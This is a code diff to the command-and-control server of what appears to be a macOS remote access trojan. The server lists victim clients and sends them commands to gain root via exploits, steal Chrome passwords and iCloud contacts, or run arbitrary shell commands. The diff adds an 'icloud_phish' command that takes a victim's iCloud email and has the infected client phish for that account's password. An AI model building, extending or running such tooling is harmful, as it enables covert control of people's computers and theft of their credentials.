@@ -20,7 +20,7 @@ MESSAGE_INFO = "\033[94m" + "[I] " + "\033[0m"
 MESSAGE_ATTENTION = "\033[91m" + "[!] " + "\033[0m"
 
 commands = ["help", "status", "clients", "connect", "get_info", "get_root", "get_computer_name",
-            "get_shell_info", "chrome_passwords", "icloud_contacts", "kill_client"]
+            "get_shell_info", "chrome_passwords", "icloud_contacts", "icloud_phish", "kill_client"]
 status_messages = []
 
 # The ID of the client is it's place in the array
@@ -37,6 +37,7 @@ def print_help():
     print "get_root          -  Attempt to get root via exploits."
     print "chrome_passwords  -  Attempt to retrieve Chrome passwords."
     print "icloud_contacts   -  Attempt to retrieve iCloud contacts."
+    print "icloud_phish      -  Attempt to get iCloud password via phishing."
     print "kill_client       -  Brutally kill the client (removes the server)."
     print "Any other command will be executed on the connected client."
 
@@ -62,9 +63,9 @@ def print_clients():
 def send_command(connection, message):
     try:
         connection.sendall(message)
+        global current_client_id
 
         response = connection.recv(4096)
-        global current_client_id
 
         if not response:  # Empty
             current_client_id = None
@@ -94,7 +95,8 @@ def start_server(port):
     status_messages.append(MESSAGE_INFO + "Waiting for clients...")
 
     while True:
-        client_connection, client_address = ssl.wrap_socket(server_socket, cert_reqs=ssl.CERT_NONE, server_side=True, keyfile="server.key", certfile="server.crt").accept()
+        client_connection, client_address = ssl.wrap_socket(server_socket, cert_reqs=ssl.CERT_NONE, server_side=True,
+                                                            keyfile="server.key", certfile="server.crt").accept()
 
         status_messages.append(MESSAGE_INFO + "New client connected!")
         connections.append(client_connection)
@@ -194,11 +196,29 @@ if __name__ == '__main__':
                                         print send_command(connections[current_client_id], "icloud_contacts")
                             else:
                                 print response
+                        elif command.startswith("icloud_phish"):
+                            email = raw_input(MESSAGE_INPUT + "iCloud Email: ")
+
+                            if "@" not in email:
+                                print MESSAGE_ATTENTION + "Please specify an email address."
+                            else:
+                                print MESSAGE_INFO + "Attempting to phish iCloud password, press Ctrl-C to stop..."
+
+                                while True:
+                                    try:
+                                        response = send_command(connections[current_client_id], "icloud_phish {0}".format(email))
+
+                                        print response
+                                        break
+                                    except KeyboardInterrupt:
+                                        print MESSAGE_INFO + "Stopping phishing attempt, waiting for phishing output..."
+                                        print send_command(connections[current_client_id], "icloud_phish_stop")
+                                        break
                         elif command == "kill_client":
                             print MESSAGE_INFO + "Removing server..."
                             response = send_command(connections[current_client_id], "kill_client")
 
-                            print MESSAGE_INFO + "Got message from client: " + response
+                            print MESSAGE_INFO + "Client says: {0}".format(response)
                             connections.remove(connections[current_client_id])
                             current_client_id = None
                             status_messages.append(MESSAGE_ATTENTION + "Client disconnected!")
@@ -222,4 +242,3 @@ if __name__ == '__main__':
         print "[I] Invalid port."
     except KeyboardInterrupt:
         print ""
-
